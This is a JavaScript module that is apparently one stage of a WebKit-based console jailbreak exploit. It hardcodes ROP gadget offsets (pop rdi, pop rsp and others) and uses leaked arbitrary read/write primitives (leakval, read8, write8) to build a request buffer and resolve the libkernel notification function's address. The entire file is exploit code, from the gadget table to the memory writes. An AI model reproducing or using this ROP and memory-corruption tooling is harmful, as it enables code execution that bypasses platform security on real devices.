import { int64 } from './resources/int64.js';

let wkBase = null;
let lkBase = null;
let lcBase = null;

export function initRop(webkitBase, libkernelBase, libcBase) {
    wkBase = webkitBase;
    lkBase = libkernelBase;
    lcBase = libcBase;
}

const GADGETS = {
    "ret": 0x000000C7,
    "pop rdi": 0x0005A469,
    "pop rsi": 0x0016B03A,
    "pop rdx": 0x00196067,
    "pop rcx": 0x00006CFA,
    "pop rax": 0x00006ECC,
    "pop rsp": 0x00001872,
};

export function getGadget(name) {
    if (!wkBase) throw new Error("ROP not initialized with webkitBase");
    const off = GADGETS[name];
    if (off === undefined) throw new Error(`Gadget ${name} not found`);
    return wkBase.add32(off);
}

export function sendNotification(text) {
    if (!globalThis.p) throw new Error("window.p not installed");
    if (!lkBase) throw new Error("libkernelBase not resolved");

    const NOTIFY_OFFSET = 0x48B0;
    const notifyFunc = lkBase.add32(NOTIFY_OFFSET);

    let encoder = new TextEncoder();
    let msgBytes = encoder.encode(text + "\x00");
    
    let buf = new Uint8Array(0x400);
    buf[4] = 0; // userId = 0
    buf.set(msgBytes, 0x20);

    let arrCell = globalThis.p.leakval(buf);
    let backingStore = globalThis.p.read8(arrCell.add32(0x10));

    globalThis.p.write8(backingStore.add32(0x8), backingStore.add32(0x20));
    globalThis.p.write4(backingStore.add32(0x10), msgBytes.length);

    console.log("[rop] Buffer de notificação preparado em: 0x" + backingStore.toString());
    console.log("[rop] Endereço de sceKernelSendNotificationRequest: 0x" + notifyFunc.toString());

    return {
        notifyFunc,
        requestBuffer: backingStore
    };
}
